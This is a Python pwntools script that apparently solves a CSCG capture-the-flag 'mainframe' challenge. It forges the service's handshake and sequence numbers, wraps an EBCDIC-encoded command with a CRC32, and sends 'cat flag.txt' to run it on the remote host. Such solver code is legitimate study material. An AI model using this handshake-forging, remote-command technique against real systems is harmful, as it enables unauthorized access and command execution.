import ebcdic
from pwn import *
from zlib import crc32	

CANDIATE_TEMPLATE = bytes.fromhex('1018008381a3406185a383618485828981956da58599a28996952523c2444130855942')

def exploit(serverid,plain):
    plain += '\n'
    enc = plain.encode('cp1141')
    crc = struct.pack('<I',crc32(enc))
    _type = b'\x10'
    _len = struct.pack('<H',len(plain))
    
    
    con = remote(f'{serverid}-mainframe.challenge.master.cscg.live',port=31337,ssl=True)
    
    # handshake
    server_chal = con.recv(1024)

    num = struct.unpack('I',server_chal[-4:])[0]

    byte_res = b'\x02'+b'\x00'*6+struct.pack('I',num+1)
    con.send(byte_res)

    seq = struct.unpack('I',con.recv(1024)[-4:])[0]

    rseq = struct.pack('I',seq+1)

    full_packet =  _type+_len+enc+crc+rseq
    
    con.send(full_packet)

    print(con.recv(1024).decode('cp1141'))


exploit('fc0b281991732588bef82415','cat flag.txt')